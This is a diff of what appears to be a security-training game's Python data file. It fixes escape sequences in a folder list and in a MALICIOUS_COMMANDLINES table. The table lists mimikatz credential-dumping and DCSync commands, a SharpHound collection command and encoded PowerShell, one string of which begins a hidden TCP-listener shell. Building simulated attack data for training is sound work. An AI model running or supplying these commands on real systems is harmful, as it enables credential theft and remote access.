@@ -50,7 +50,7 @@ COMMON_USER_FILE_LOCATIONS  = [
     "C:\\Users\\{username}\\Pictures\\",
     "C:\\Users\\{username}\\Desktop\\",
     "C:\\Users\\{username}\\Videos\\",
-    "C:\\Users\\{username}\Music\\"
+    "C:\\Users\\{username}\\Music\\"
 ]
 
 # processes for creating files
@@ -360,7 +360,7 @@ LEGIT_PARENT_PROCESSES={
 MALICIOUS_COMMANDLINES={
 	"mimikatz.exe":"sekurlsa::logonpasswords",
 	"powershell.exe":"powershell -nop -w hidden -enc d2hvYW1p",
-	"mimikatz.exe":"lsadump::dcsync /user:domain\krbtgt /domain:lab.local", #Does our game have a company name variant to add here instead of "lab"
+	"mimikatz.exe":"lsadump::dcsync /user:domain\\krbtgt /domain:lab.local", #Does our game have a company name variant to add here instead of "lab"
 	"sharphound.exe":"SharpHound.exe --CollectionMethods Session --Loop",
     "powershell.exe": "-nop -enc IyRsaXN0ZW5lciA9IFtTeXN0ZW0uTmV0LlNvY2tldHMuVGNwTGlzdGVuZXJdNDQzOyRsaXN0ZW5lci5zdGFy" +
     "dCgpOyRjbGllbnQgPSAkbGlzdGVuZXIuQWNjZXB0VGNwQ2xpZW50KCk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGV" +
